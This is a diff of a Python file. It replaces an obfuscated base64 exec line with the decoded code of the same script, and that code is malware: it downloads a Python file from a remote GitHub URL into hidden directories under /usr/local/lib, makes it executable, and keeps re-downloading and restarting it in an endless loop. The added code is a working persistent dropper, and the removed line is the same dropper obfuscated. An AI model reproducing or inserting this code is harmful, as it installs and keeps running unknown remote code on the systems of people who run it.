@@ -1,3 +1,35 @@
+import os
+import time
+import subprocess
+import urllib.request
 
-import base64
-exec(base64.b64decode("aW1wb3J0IG9zCmltcG9ydCB0aW1lCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCB1cmxsaWIucmVxdWVzdAoKVVJMID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS90NTZyNHJlLzM0NTUzL3JlZnMvaGVhZHMvbWFpbi9zZHMucHkiCkxPQzEgPSAiL3Vzci9sb2NhbC9saWIvLmhpZGRlbjEvc2RzLnB5IgpMT0MyID0gIi91c3IvbG9jYWwvbGliLy5oaWRkZW4yL3Nkcy5weSIKZGVmIGRvd25sb2FkX2ZpbGUocGF0aCk6CiAgICBvcy5tYWtlZGlycyhvcy5wYXRoLmRpcm5hbWUocGF0aCksIGV4aXN0X29rPVRydWUpCiAgICB1cmxsaWIucmVxdWVzdC51cmxyZXRyaWV2ZShVUkwsIHBhdGgpCiAgICBvcy5jaG1vZChwYXRoLCAwbzcwMCkKICAgIHByaW50KGYiWytdIERvd25sb2FkZWQ6IHtwYXRofSIpCmRlZiBlbnN1cmVfZmlsZXMoKToKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhMT0MxKToKICAgICAgICBkb3dubG9hZF9maWxlKExPQzEpCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoTE9DMik6CiAgICAgICAgZG93bmxvYWRfZmlsZShMT0MyKQpkZWYgZW5zdXJlX3J1bm5pbmcocHJvY2Vzc2VzKToKICAgIGZvciBsb2MgaW4gW0xPQzEsIExPQzJdOgogICAgICAgIGlmIG5vdCBwcm9jZXNzZXMuZ2V0KGxvYykgb3IgcHJvY2Vzc2VzW2xvY10ucG9sbCgpIGlzIG5vdCBOb25lOgogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhsb2MpOgogICAgICAgICAgICAgICAgcHJvY2Vzc2VzW2xvY10gPSBzdWJwcm9jZXNzLlBvcGVuKFsicHl0aG9uMyIsIGxvY10pCiAgICAgICAgICAgICAgICBwcmludChmIlsrXSBTdGFydGVkOiB7bG9jfSIpCgpkZWYgbWFpbigpOgogICAgcHJvY2Vzc2VzID0ge30KICAgIHdoaWxlIFRydWU6CiAgICAgICAgZW5zdXJlX2ZpbGVzKCkKICAgICAgICBlbnN1cmVfcnVubmluZyhwcm9jZXNzZXMpCiAgICAgICAgdGltZS5zbGVlcCgxMCkgCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgbWFpbigpCgo=").decode())
+URL = "https://raw.githubusercontent.com/t56r4re/34553/refs/heads/main/sds.py"
+LOC1 = "/usr/local/lib/.hidden1/sds.py"
+LOC2 = "/usr/local/lib/.hidden2/sds.py"
+def download_file(path):
+    os.makedirs(os.path.dirname(path), exist_ok=True)
+    urllib.request.urlretrieve(URL, path)
+    os.chmod(path, 0o700)
+    print(f"[+] Downloaded: {path}")
+def ensure_files():
+    if not os.path.exists(LOC1):
+        download_file(LOC1)
+    if not os.path.exists(LOC2):
+        download_file(LOC2)
+def ensure_running(processes):
+    for loc in [LOC1, LOC2]:
+        if not processes.get(loc) or processes[loc].poll() is not None:
+            if os.path.exists(loc):
+                processes[loc] = subprocess.Popen(["python3", loc])
+                print(f"[+] Started: {loc}")
+
+def main():
+    processes = {}
+    while True:
+        ensure_files()
+        ensure_running(processes)
+        time.sleep(10) 
+
+if __name__ == "__main__":
+    main()
+
